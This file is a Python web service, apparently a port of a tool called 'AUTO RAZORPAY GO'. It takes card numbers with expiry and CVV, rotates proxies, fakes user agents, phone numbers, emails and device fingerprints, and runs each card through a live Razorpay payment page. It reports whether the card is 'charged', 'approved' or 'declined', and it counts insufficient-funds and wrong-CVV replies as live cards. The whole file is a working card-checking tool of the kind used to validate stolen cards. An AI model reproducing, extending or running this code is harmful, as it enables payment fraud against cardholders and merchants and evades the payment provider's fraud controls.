# =============================================================================
# razorpay_api.py — Python port of AUTO RAZORPAY GO
# Contract: GET /rz?cc=CARD|MM|YYYY|CVV[&proxy=ip:port:user:pass]
# Returns: {"status":"charged|approved|declined|error","response":"...","proxy":"..."}
# =============================================================================

import asyncio
import base64
import hashlib
import json
import logging
import os
import random
import re
import secrets
import ssl
import string
import time
from urllib.parse import quote, unquote, urlencode, urlparse

import aiohttp
from aiohttp import web

# ─────────────────────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────────────────────

BUILD    = os.getenv("RZ_BUILD",    "9cb57fdf457e44eac4384e182f925070ff5488d9")
BUILD_V1 = os.getenv("RZ_BUILD_V1", "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2")
PORT     = int(os.getenv("RZ_PORT") or os.getenv("PORT") or 7070)

TARGET_URLS = [u.strip() for u in os.getenv(
    "RZ_TARGET_URL",
    "https://pages.razorpay.com/lckuk-international",
).split(",") if u.strip()]

PROXY_FILE     = os.getenv("RZ_PROXY_FILE", "px.txt")
HTTP_TIMEOUT   = int(os.getenv("RZ_TIMEOUT", "30"))
DIRECT_FALLBACK = os.getenv("RZ_DIRECT_FALLBACK", "0") == "1"  # if no proxy -> direct

logging.basicConfig(level=logging.INFO, format="[%(asctime)s] [%(levelname)s] %(message)s")
log = logging.getLogger("RZAPI")

# ─────────────────────────────────────────────────────────────────────────────
# PROXY HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def format_proxy(raw: str) -> str:
    """Accept many formats -> http://user:pass@ip:port (or http://ip:port)."""
    if not raw:
        return ""
    raw = raw.strip()
    if "://" in raw:
        return raw
    parts = raw.split(":")
    if len(parts) == 4:
        # ip:port:user:pass  (file 1 compact form)
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{raw}"
    return "http://" + raw


def load_proxies(path: str):
    out = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for ln in f:
                ln = ln.strip()
                if not ln or ln.startswith("#"):
                    continue
                p = format_proxy(ln)
                if p:
                    out.append(p)
    except FileNotFoundError:
        pass
    return out


def mask_proxy(proxy_url: str, status: str) -> str:
    if not proxy_url:
        return f"DIRECT [{status}]"
    try:
        u = urlparse(proxy_url)
        host = u.hostname or ""
        port = u.port or ""
        return f"{u.scheme}://{host}:{port} [{status}]"
    except Exception:
        return re.sub(r"//[^@]+@", "//***@", proxy_url) + f" [{status}]"

# ─────────────────────────────────────────────────────────────────────────────
# UTILITY
# ─────────────────────────────────────────────────────────────────────────────

_B62 = string.ascii_letters + string.digits
_UA_MAJOR = (120, 147)


def gen_ua() -> str:
    major = random.randint(*_UA_MAJOR)
    build = random.randint(5000, 6999)
    patch = random.randint(50, 249)
    return (f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            f"(KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36")


def gen_indian_phone() -> str:
    first = random.choice("6789")
    rest = "".join(str(random.randint(0, 9)) for _ in range(9))
    return "+91" + first + rest


def gen_email() -> str:
    names = ["alex", "john", "mike", "sara", "david", "emma", "james", "lisa", "chris", "anna"]
    return f"{random.choice(names)}{random.randint(100, 9999)}@gmail.com"


def get_brand(cc: str) -> str:
    if cc.startswith("4"):
        return "visa"
    if len(cc) >= 2:
        two = cc[:2]
        if two in ("51", "52", "53", "54", "55"):
            return "mastercard"
        if two in ("34", "37"):
            return "amex"
    if cc.startswith("6011") or cc.startswith("65"):
        return "discover"
    return "unknown"


def find_between(content: str, start: str, end: str) -> str:
    si = content.find(start)
    if si == -1:
        return ""
    si += len(start)
    ei = content.find(end, si)
    if ei == -1:
        return ""
    return content[si:ei]


def extract_json_var(content: str, var_name: str) -> str:
    """Brace-counting parser — safer than regex for nested JSON."""
    prefix = f"var {var_name} ="
    start = content.find(prefix)
    if start == -1:
        return ""
    start += len(prefix)
    while start < len(content) and content[start] in " \t\n\r":
        start += 1
    if start >= len(content) or content[start] != "{":
        return ""
    depth = 0
    in_str = False
    esc = False
    for i in range(start, len(content)):
        c = content[i]
        if esc:
            esc = False
            continue
        if c == "\\" and in_str:
            esc = True
            continue
        if c == '"':
            in_str = not in_str
            continue
        if in_str:
            continue
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                return content[start:i + 1]
    return ""


def generate_rzp_device_id():
    buf = secrets.token_bytes(16)
    h = hashlib.sha1(buf).hexdigest()
    ts = str(int(time.time() * 1000))
    rnd = f"{random.randint(0, 99999999):08d}"
    return f"1.{h}.{ts}.{rnd}", h


def generate_rzp_session_id() -> str:
    return "".join(secrets.choice(_B62) for _ in range(14))


def get_str(m: dict, key: str) -> str:
    if not m:
        return ""
    v = m.get(key)
    if v is None:
        return ""
    if isinstance(v, str):
        return v
    return str(v)


def get_float(m: dict, key: str) -> float:
    if not m:
        return 0.0
    v = m.get(key)
    if isinstance(v, (int, float)):
        return float(v)
    if isinstance(v, str):
        try:
            return float(v)
        except ValueError:
            return 0.0
    return 0.0


def truncate(s: str, n: int) -> str:
    return s if len(s) <= n else s[:n]


def parse_card(card_data: str):
    """Accepts cc|mm|yy|cvv (also /, space separators). Year can be 2 or 4 digits."""
    card_data = card_data.strip()
    for sep in ("|", "/", " "):
        parts = card_data.split(sep)
        if len(parts) >= 4:
            cc, mm, yy, cvv = (p.strip() for p in parts[:4])
            if (cc.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit()
                    and 13 <= len(cc) <= 19 and 1 <= int(mm) <= 12
                    and len(yy) in (2, 4) and len(cvv) in (3, 4)):
                return {"cc": cc, "mm": f"{int(mm):02d}", "yy": yy, "cvv": cvv}
    return None

# ─────────────────────────────────────────────────────────────────────────────
# RESPONSE CLASSIFICATION
# ─────────────────────────────────────────────────────────────────────────────

BALANCE_KEYWORDS = [
    "insufficient account balance",
    "insufficient funds",
    "maximum transaction limit",
    "transaction limit exceeded",
]


def is_balance_keyword(msg_lower: str) -> bool:
    return any(k in msg_lower for k in BALANCE_KEYWORDS)


def is_cvv_keyword(msg_lower: str, err_code: str) -> bool:
    if "cvv provided is incorrect" in msg_lower:
        return True
    if "ncorrect_cvv" in msg_lower:
        return True
    if err_code.lower() == "incorrect_cvv":
        return True
    return False


PROXY_ERR_MARKERS = [
    "econnrefused", "econnreset", "etimedout", "enotfound",
    "could not resolve", "couldnt_resolve", "could not connect",
    "operation_timeouted", "curle_proxy",
    "socket hang up", "hpe_invalid", "fetch failed",
    "no such host", "connection refused", "connection reset",
    "i/o timeout", "timeout", "proxyconnect", "proxy error",
    "proxy dead", "proxy timeout", "ssl", "unreachable",
    "cannot connect", "cannot connect to host",
]


def is_proxy_error(msg: str) -> bool:
    m = msg.lower()
    return any(k in m for k in PROXY_ERR_MARKERS)


def make_proxy_error(err: Exception, proxy_url: str):
    msg = truncate(str(err), 120)
    dead = is_proxy_error(msg)
    return {
        "status": "error",
        "response": f"proxy error: {msg}" if dead else msg,
        "proxy": mask_proxy(proxy_url, "DEAD" if dead else "LIVE"),
        "proxy_status": "DEAD" if dead else "LIVE",
    }

# ─────────────────────────────────────────────────────────────────────────────
# HTTP FETCH WRAPPER (aiohttp)
# ─────────────────────────────────────────────────────────────────────────────

class Fetch:
    def __init__(self, session: aiohttp.ClientSession, proxy_url: str, ua: str):
        self.session = session
        self.proxy = proxy_url or None
        self.ua = ua

    async def _do(self, method: str, url: str, headers: dict, data):
        h = {"User-Agent": self.ua}
        if headers:
            h.update(headers)
        kwargs = {"headers": h, "allow_redirects": True, "max_redirects": 5}
        if self.proxy:
            kwargs["proxy"] = self.proxy
        if data is not None:
            kwargs["data"] = data
        async with self.session.request(method, url, **kwargs) as r:
            body = await r.text(errors="ignore")
            return body, r.status, dict(r.headers)

    async def get(self, url: str, headers: dict = None):
        return await self._do("GET", url, headers or {}, None)

    async def post_json(self, url: str, headers: dict, payload):
        h = dict(headers or {})
        h.setdefault("Content-Type", "application/json")
        body = json.dumps(payload, separators=(",", ":")).encode()
        return await self._do("POST", url, h, body)

    async def post_form(self, url: str, headers: dict, form: dict):
        h = dict(headers or {})
        h.setdefault("Content-Type", "application/x-www-form-urlencoded")
        body = urlencode(form, doseq=True)
        return await self._do("POST", url, h, body)

# ─────────────────────────────────────────────────────────────────────────────
# RAZORPAY FLOW
# ─────────────────────────────────────────────────────────────────────────────

async def check_card(cc: str, mm: str, yy: str, cvv: str,
                     proxy_url: str, target_url: str):
    yy2 = yy[-2:] if len(yy) == 4 else yy
    year = int("20" + yy2)
    brand = get_brand(cc)
    ua = gen_ua()
    phone = gen_indian_phone()
    phone_short = phone[3:]
    email = gen_email()
    rzp_device_id, fhash = generate_rzp_device_id()
    rzp_session_id = generate_rzp_session_id()

    # ── aiohttp session (cookies on, TLS off)
    cookie_jar = aiohttp.CookieJar(unsafe=True)
    conn = aiohttp.TCPConnector(ssl=False, limit=20)
    timeout = aiohttp.ClientTimeout(total=HTTP_TIMEOUT)

    async with aiohttp.ClientSession(cookie_jar=cookie_jar, connector=conn,
                                     timeout=timeout) as session:
        fetch = Fetch(session, proxy_url, ua)

        # ── STEP 1 — load payment page, extract `var data = {...}`
        try:
            r1_text, r1_status, _ = await fetch.get(target_url, {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
            })
        except Exception as e:
            return make_proxy_error(e, proxy_url)

        json_str = extract_json_var(r1_text, "data")
        if not json_str:
            return {"status": "error",
                    "response": "Failed to locate Razorpay data on page",
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        try:
            init_data = json.loads(json_str)
        except Exception:
            try:
                inner = json.loads(json_str)
                init_data = json.loads(inner) if isinstance(inner, str) else inner
            except Exception as e:
                return {"status": "error",
                        "response": f"Failed to parse Razorpay JSON data: {truncate(str(e), 80)}",
                        "proxy": mask_proxy(proxy_url, "LIVE"),
                        "proxy_status": "LIVE"}

        kyid = get_str(init_data, "key_id") or get_str(init_data, "key")
        if not kyid:
            return {"status": "error",
                    "response": "Razorpay Key ID not found",
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        plink = ""
        ppid = ""
        FORCE_AMOUNT = 100.0

        if isinstance(init_data.get("payment_link"), dict):
            obj = init_data["payment_link"]
            plink = get_str(obj, "id")
            items = obj.get("payment_page_items") or []
            if isinstance(items, list) and items and isinstance(items[0], dict):
                ppid = get_str(items[0], "id")
        elif isinstance(init_data.get("payment_page"), dict):
            obj = init_data["payment_page"]
            plink = get_str(obj, "id")
            items = obj.get("payment_page_items") or []
            if isinstance(items, list) and items and isinstance(items[0], dict):
                ppid = get_str(items[0], "id")

        if not plink:
            return {"status": "error",
                    "response": "Payment Link ID not found in page structure",
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        keyless_header = get_str(init_data, "keyless_header")
        keyless_header_url = quote(keyless_header, safe="")

        # ── STEP 2 — create order
        r2_payload = {
            "notes": {"comment": "", "name": "User"},
            "line_items": [{"payment_page_item_id": ppid, "amount": FORCE_AMOUNT}],
        }
        try:
            r2_text, _, _ = await fetch.post_json(
                f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
                {
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json",
                    "Origin": "https://pages.razorpay.com",
                    "Referer": "https://pages.razorpay.com/",
                },
                r2_payload,
            )
        except Exception as e:
            return make_proxy_error(e, proxy_url)

        try:
            r2_data = json.loads(r2_text)
        except Exception as e:
            return {"status": "error",
                    "response": f"Order response parse failed: {truncate(str(e), 80)}",
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        order_obj = r2_data.get("order") or {}
        order_id = get_str(order_obj, "id")
        if not order_id:
            err_obj = r2_data.get("error") or {}
            err_msg = get_str(err_obj, "description") or "Order creation failed"
            return {"status": "error", "response": err_msg,
                    "proxy": mask_proxy(proxy_url, "LIVE"), "proxy_status": "LIVE"}

        checkout_id = order_id.split("_", 1)[1] if "_" in order_id else order_id
        order_amount = get_float(order_obj, "amount") or FORCE_AMOUNT
        if order_amount < 100:
            order_amount = FORCE_AMOUNT
        order_currency = get_str(order_obj, "currency") or "INR"

        # ── STEP 3 — checkout/public -> session token
        params3 = {
            "traffic_env": "production",
            "build": BUILD,
            "build_v1": BUILD_V1,
            "checkout_v2": "1",
            "new_session": "1",
            "keyless_header": keyless_header,
            "rzp_device_id": rzp_device_id,
            "unified_session_id": rzp_session_id,
        }
        try:
            r3_text, _, _ = await fetch.get(
                "https://api.razorpay.com/v1/checkout/public?" + urlencode(params3),
                {"Accept": "text/html,application/xhtml+xml,*/*",
                 "Referer": "https://pages.razorpay.com/"},
            )
        except Exception as e:
            return make_proxy_error(e, proxy_url)

        sessid = find_between(r3_text, 'window.session_token="', '";')
        if not sessid:
            m = re.search(r'session_token["\']?\s*[:=]\s*["\']([A-F0-9]{40,})["\']', r3_text)
            if m:
                sessid = m.group(1)
        if not sessid:
            return {"status": "error",
                    "response": "Session token not found",
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        rzp_ref = (
            "https://api.razorpay.com/v1/checkout/public?"
            f"traffic_env=production&build={BUILD}&build_v1={BUILD_V1}"
            f"&checkout_v2=1&new_session=1&unified_session_id={rzp_session_id}"
            f"&session_token={sessid}"
        )

        def std_headers():
            return {
                "Accept": "*/*",
                "Origin": "https://api.razorpay.com",
                "Referer": rzp_ref,
                "x-session-token": sessid,
            }

        # ── STEP 4 — preferences (fire and forget)
        try:
            resources = ["checkout_version_config", "merchant", "merchant_features",
                         "downtime", "customer", "customer_tokens", "truecaller",
                         "methods", "experiments", "offers", "checkout_config",
                         "order", "invoice", "buyer_protection", "personalization"]
            r4_payload = {
                "query": [{"resource": r} for r in resources],
                "query_params": {
                    "device_id": rzp_device_id,
                    "rtb_device_id": fhash,
                    "amount": order_amount,
                    "currency": order_currency,
                    "option_currency": order_currency,
                    "truecaller": False,
                    "qr_required": False,
                    "library": "checkoutjs",
                    "platform": "browser",
                    "order_id": order_id,
                    "payment_link_id": plink,
                    "contact": phone,
                },
                "action": "get",
            }
            h4 = std_headers(); h4["Content-Type"] = "application/json"
            await fetch.post_json(
                f"https://api.razorpay.com/v2/standard_checkout/preferences"
                f"?x_entity_id={order_id}&session_token={sessid}&keyless_header={keyless_header}",
                h4, r4_payload,
            )
        except Exception as e:
            log.debug("step4 preferences failed: %s", e)

        # ── STEP 5 — checkout/order (fire and forget)
        try:
            form5 = {
                "notes[email]": email,
                "notes[phone]": phone_short,
                "payment_link_id": plink,
                "key_id": kyid,
                "contact": phone,
                "email": email,
                "currency": order_currency,
                "_[integration]": "payment_pages",
                "_[device.id]": rzp_device_id,
                "_[library]": "checkoutjs",
                "_[library_src]": "no-src",
                "_[current_script_src]": "no-src",
                "_[platform]": "browser",
                "_[env]": "",
                "_[is_magic_script]": "false",
                "_[os]": "windows",
                "_[shield][fhash]": fhash,
                "_[shield][tz]": "0",
                "_[device_id]": rzp_device_id,
                "_[build]": BUILD,
                "_[shield][os]": "windows",
                "_[shield][platform]": "browser",
                "_[shield][browser]": "chrome",
                "_[request_index]": "0",
                "amount": f"{order_amount:.0f}",
                "order_id": order_id,
                "method": "card",
                "checkout_id": checkout_id,
            }
            await fetch.post_form(
                f"https://api.razorpay.com/v1/standard_checkout/checkout/order"
                f"?key_id={kyid}&session_token={sessid}&keyless_header={keyless_header}",
                std_headers(), form5,
            )
        except Exception as e:
            log.debug("step5 checkout/order failed: %s", e)

        # ── STEP 6 — cb_flows (fire and forget)
        try:
            r6_payload = {
                "identifiers": {
                    "merchant": {"country": "IN"},
                    "card": {"country": "US", "dcc_blacklist": False, "network": brand},
                    "method": "card",
                    "payment_currency": order_currency,
                },
                "forex_charges": {
                    "amount": order_amount,
                    "currency": order_currency,
                    "filters": {"method": "card"},
                },
            }
            h6 = std_headers(); h6["Content-Type"] = "application/json"
            await fetch.post_json(
                f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows"
                f"?x_entity_id={order_id}&keyless_header={keyless_header_url}",
                h6, r6_payload,
            )
        except Exception as e:
            log.debug("step6 cb_flows failed: %s", e)

        # ── STEP 7 — create payment (the money shot)
        token_create = base64.b64encode(
            json.dumps([{"name": "sardine",
                         "metadata": {"session_id": checkout_id}}]).encode()
        ).decode()

        form7 = {
            "user_risk_providers_token": token_create,
            "notes[comment]": "",
            "notes[email]": email,
            "notes[phone]": phone_short,
            "notes[name]": "User",
            "payment_link_id": plink,
            "key_id": kyid,
            "contact": phone,
            "email": email,
            "currency": order_currency,
            "_[integration]": "payment_pages",
            "_[checkout_id]": checkout_id,
            "_[device.id]": rzp_device_id,
            "_[env]": "",
            "_[library]": "checkoutjs",
            "_[library_src]": "no-src",
            "_[current_script_src]": "no-src",
            "_[is_magic_script]": "false",
            "_[platform]": "browser",
            "_[referer]": target_url,
            "_[shield][fhash]": fhash,
            "_[shield][tz]": "-330",
            "_[device_id]": rzp_device_id,
            "_[build]": BUILD,
            "_[shield][os]": "windows",
            "_[shield][platform]": "browser",
            "_[shield][browser]": "chrome",
            "_[request_index]": "1",
            "amount": f"{order_amount:.0f}",
            "order_id": order_id,
            "method": "card",
            "card[number]": cc,
            "card[cvv]": cvv,
            "card[name]": "User",
            "card[expiry_month]": mm,
            "card[expiry_year]": str(year),
            "save": "0",
            "dcc_currency": order_currency,
        }

        try:
            r7_text, _, _ = await fetch.post_form(
                f"https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
                f"?x_entity_id={order_id}&session_token={sessid}&keyless_header={keyless_header}",
                std_headers(), form7,
            )
        except Exception as e:
            return make_proxy_error(e, proxy_url)

        try:
            r7_data = json.loads(r7_text)
        except Exception:
            return {"status": "error",
                    "response": "Payment create response parse failed",
                    "proxy": mask_proxy(proxy_url, "LIVE"),
                    "proxy_status": "LIVE"}

        payment_id = get_str(r7_data, "payment_id") or get_str(r7_data, "id")

        if not payment_id:
            err_obj = r7_data.get("error") or {}
            err_desc = get_str(err_obj, "description").replace(
                " Try another payment method or contact your bank for details.", "").strip()
            err_code = get_str(err_obj, "reason")
            label = f"{err_desc} ({err_code})" if err_code else (err_desc or "Unknown Decline")
            msg_lower = err_desc.lower()
            if is_balance_keyword(msg_lower) or is_cvv_keyword(msg_lower, err_code):
                return {"status": "approved", "response": label,
                        "proxy": mask_proxy(proxy_url, "LIVE"), "proxy_status": "LIVE"}
            return {"status": "declined", "response": label,
                    "proxy": mask_proxy(proxy_url, "LIVE"), "proxy_status": "LIVE"}

        pid_clean = payment_id.split("_", 1)[1] if "_" in payment_id else payment_id

        # ── STEP 8a — authenticate (empty form)
        try:
            await fetch.post_form(
                f"https://api.razorpay.com/pg_router/v1/payments/{payment_id}/authenticate",
                {"content-type": "application/x-www-form-urlencoded"},
                {},
            )
        except Exception as e:
            log.debug("step8a authenticate failed: %s", e)

        await asyncio.sleep(1.0)

        # ── STEP 8b — authenticate (3ds2Auth details)
        try:
            screen = random.choice([(1920, 1080), (1366, 768), (1536, 864), (1440, 900)])
            depth = random.choice([24, 32])
            form8 = {
                "browser[java_enabled]": "false",
                "browser[javascript_enabled]": "true",
                "browser[timezone_offset]": "0",
                "browser[color_depth]": str(depth),
                "browser[screen_width]": str(screen[0]),
                "browser[screen_height]": str(screen[1]),
                "browser[language]": "en-US",
                "auth_step": "3ds2Auth",
            }
            await fetch.post_form(
                f"https://api.razorpay.com/pg_router/v1/payments/{pid_clean}/authenticate",
                {"content-type": "application/x-www-form-urlencoded"},
                form8,
            )
        except Exception as e:
            log.debug("step8b 3ds2Auth failed: %s", e)

        # ── STEP 9 — cancel (final state)
        try:
            r9_text, _, _ = await fetch.get(
                f"https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel"
                f"?key_id={kyid}&session_token={sessid}&keyless_header={keyless_header}",
                {
                    "Accept": "*/*",
                    "Content-type": "application/x-www-form-urlencoded",
                    "Referer": rzp_ref,
                    "x-session-token": sessid,
                },
            )
        except Exception as e:
            return make_proxy_error(e, proxy_url)

        try:
            r9_data = json.loads(r9_text)
        except Exception:
            return {"status": "declined", "response": "Cancel response parse failed",
                    "proxy": mask_proxy(proxy_url, "LIVE"), "proxy_status": "LIVE"}

        if "razorpay_payment_id" in r9_text:
            return {"status": "charged", "response": "Payment Successful",
                    "proxy": mask_proxy(proxy_url, "LIVE"), "proxy_status": "LIVE"}

        err_obj = r9_data.get("error") or {}
        err_desc = get_str(err_obj, "description").replace(
            " Try another payment method or contact your bank for details.", "").strip()
        err_code = get_str(err_obj, "reason")
        label = f"{err_desc} ({err_code})" if err_code else (err_desc or "Unknown Decline")
        msg_lower = err_desc.lower()

        if is_balance_keyword(msg_lower) or is_cvv_keyword(msg_lower, err_code):
            return {"status": "approved", "response": label,
                    "proxy": mask_proxy(proxy_url, "LIVE"), "proxy_status": "LIVE"}

        return {"status": "declined", "response": label,
                "proxy": mask_proxy(proxy_url, "LIVE"), "proxy_status": "LIVE"}

# ─────────────────────────────────────────────────────────────────────────────
# HTTP HANDLER
# ─────────────────────────────────────────────────────────────────────────────

_FILE_PROXIES = load_proxies(PROXY_FILE)
_proxy_counter = 0


def next_file_proxy() -> str:
    global _proxy_counter
    if not _FILE_PROXIES:
        return ""
    _proxy_counter += 1
    return _FILE_PROXIES[_proxy_counter % len(_FILE_PROXIES)]


async def handle_rz(request: web.Request) -> web.Response:
    cc_raw = request.query.get("cc", "").strip()
    proxy_raw = request.query.get("proxy", "").strip()
    site_raw = request.query.get("site", "").strip()

    if not cc_raw:
        return web.json_response(
            {"status": "error", "response": "Missing cc parameter",
             "proxy": "N/A"}, status=400)

    card = parse_card(unquote(cc_raw))
    if not card:
        return web.json_response(
            {"status": "error", "response": "Invalid card format. Use cc|mm|yy|cvv",
             "proxy": "N/A"}, status=400)

    if proxy_raw:
        proxy_url = format_proxy(unquote(proxy_raw))
    else:
        proxy_url = next_file_proxy()

    if not proxy_url and not DIRECT_FALLBACK:
        return web.json_response(
            {"status": "error", "response": "proxy error: no proxy provided",
             "proxy": "N/A"}, status=500)

    target_url = site_raw or (TARGET_URLS[_proxy_counter % len(TARGET_URLS)]
                              if TARGET_URLS else "")

    if not target_url:
        return web.json_response(
            {"status": "error", "response": "No target URL configured",
             "proxy": "N/A"}, status=500)

    try:
        result = await check_card(card["cc"], card["mm"], card["yy"], card["cvv"],
                                  proxy_url, target_url)
    except Exception as e:
        log.exception("check_card crashed")
        result = {"status": "error", "response": truncate(f"internal error: {e}", 120),
                  "proxy": mask_proxy(proxy_url, "LIVE"), "proxy_status": "LIVE"}

    log.info("[%s] %s | %s | site=%s",
             result.get("status", "?").upper(),
             card["cc"][:6] + "******" + card["cc"][-4:],
             result.get("response", "")[:80],
             target_url)

    http_status = 500 if result.get("status") == "error" else 200
    return web.json_response(result, status=http_status)


async def handle_health(request: web.Request) -> web.Response:
    return web.json_response({
        "status": "ok",
        "build": BUILD,
        "target_urls": TARGET_URLS,
        "file_proxies": len(_FILE_PROXIES),
    })


def build_app() -> web.Application:
    app = web.Application()
    app.router.add_get("/rz", handle_rz)
    app.router.add_get("/razorpay", handle_rz)   # alias
    app.router.add_get("/", handle_health)
    app.router.add_get("/health", handle_health)
    return app


def main():
    log.info("=" * 60)
    log.info("  RAZORPAY API — Python port")
    log.info("  Port    : %d", PORT)
    log.info("  Target  : %s", TARGET_URLS)
    log.info("  Proxies : %d from %s", len(_FILE_PROXIES), PROXY_FILE)
    log.info("  Endpoint: GET /rz?cc=CC|MM|YYYY|CVV&proxy=ip:port:user:pass")
    log.info("=" * 60)
    web.run_app(build_app(), host="0.0.0.0", port=PORT, access_log=None)


if __name__ == "__main__":
    main()